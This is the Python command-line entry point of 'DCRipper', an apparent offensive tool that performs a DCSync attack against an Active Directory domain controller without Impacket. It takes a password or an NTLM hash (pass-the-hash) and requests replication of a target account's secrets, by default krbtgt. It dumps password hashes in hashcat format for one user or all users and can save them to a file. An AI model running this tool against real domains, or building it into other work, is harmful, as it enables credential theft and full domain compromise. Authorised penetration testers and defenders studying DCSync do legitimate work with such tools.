#!/usr/bin/env python3
import argparse
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from typing import Optional
from config import SyncConfig
from drsr.client import DRSRClient
from output.formatter import OutputFormatter
from parser.sid import get_rid_from_sid

BANNER = r"""
  ____   ____ ____  _                       
 |  _ \ / ___|  _ \(_)_ __  _ __   ___ _ __ 
 | | | | |   | |_) | | '_ \| '_ \ / _ \ '__|
 | |_| | |___|  _ <| | |_) | |_) |  __/ |   
 |____/ \____|_| \_\_| .__/| .__/ \___|_|   
                     |_|   |_|              
      DCSync Without Impacket - Zero Dependencies
"""

def parse_args():
    parser = argparse.ArgumentParser(
        description="DCRipper - DCSync without Impacket",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -dc dc.domain.local -d DOMAIN -u admin -p Password123
  %(prog)s -dc 10.0.0.1 -d DOMAIN -u admin -H aad3b435b51404eeaad3b435b51404ee:ntlmhash
  %(prog)s -dc dc.domain.local -d DOMAIN -u admin -p Pass -t krbtgt
        """
    )
    
    parser.add_argument("-dc", "--dc-ip", required=True,
                       help="IP address or hostname of the domain controller")
    parser.add_argument("-d", "--domain", required=True,
                       help="Target domain name (NETBIOS or FQDN)")
    parser.add_argument("-u", "--username", required=True,
                       help="Username for authentication")
    parser.add_argument("-p", "--password", default="",
                       help="Password for authentication")
    parser.add_argument("-H", "--hashes", default="",
                       help="NTLM hash in format LMHASH:NTHASH or just NTHASH")
    parser.add_argument("-t", "--target", default="",
                       help="Target user to dump (default: dump krbtgt)")
    parser.add_argument("-a", "--all", action="store_true",
                       help="Dump all users (not implemented yet)")
    parser.add_argument("-o", "--output", default="",
                       help="Output file")
    parser.add_argument("-f", "--format", default="hashcat",
                       choices=["hashcat", "json"],
                       help="Output format (default: hashcat)")
    parser.add_argument("--smb", action="store_true",
                       help="Use SMB named pipe transport instead of TCP")
    parser.add_argument("--timeout", type=int, default=30,
                       help="Connection timeout in seconds")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Verbose output")
    
    return parser.parse_args()


def parse_hashes(hashes_str: str) -> str:
    if not hashes_str:
        return ""
    
    if ":" in hashes_str:
        parts = hashes_str.split(":")
        if len(parts) == 2:
            return parts[1]
    
    return hashes_str


def main():
    print(BANNER)
    
    args = parse_args()
    
    ntlm_hash = parse_hashes(args.hashes)
    
    if not args.password and not ntlm_hash:
        print("[-] Error: Either password (-p) or hash (-H) is required")
        sys.exit(1)
    
    config = SyncConfig(
        target_dc=args.dc_ip,
        domain=args.domain.upper(),
        username=args.username,
        password=args.password,
        ntlm_hash=ntlm_hash,
        target_user=args.target if args.target else "krbtgt",
        use_smb=args.smb,
        timeout=args.timeout,
        verbose=args.verbose,
        output_format=args.format
    )
    
    print(f"[*] Target DC: {config.target_dc}")
    print(f"[*] Domain: {config.domain}")
    print(f"[*] Username: {config.username}")
    print(f"[*] Target user: {config.target_user}")
    print()
    
    try:
        with DRSRClient(config) as client:
            print("[+] Connected to DC")
            print(f"[*] Domain DN: {client.get_domain_dn()}")

            formatter = OutputFormatter(config.domain, client.session_key)
            all_output = []

            if args.all:
                # Dump all users
                print("\n[*] Dumping all users...")
                user_count = 0

                for result in client.dump_all_users():
                    if result and result.nt_hash:
                        output = formatter.format_user(result, config.output_format)
                        all_output.append(output)
                        print(output)
                        user_count += 1

                print(f"\n[+] Dumped {user_count} users with password hashes")
            else:
                # Dump single user
                print(f"\n[*] Requesting replication for: {config.target_user}")

                result = client.get_user_secrets(config.target_user)

                if result:
                    print("[+] Got replication data!")

                    output = formatter.format_user(result, config.output_format)
                    all_output.append(output)

                    print("\n" + "=" * 60)
                    print(output)
                    print("=" * 60)
                else:
                    print("[-] No data returned from replication request")
                    print("    This could mean:")
                    print("    - Target user doesn't exist")
                    print("    - Insufficient privileges (need Replicating Directory Changes All)")
                    print("    - Network/protocol error")

            if args.output and all_output:
                with open(args.output, "w") as f:
                    f.write("\n".join(all_output) + "\n")
                print(f"\n[+] Output saved to: {args.output}")
    
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    
    print("\n[+] Done!")


if __name__ == "__main__":
    main()
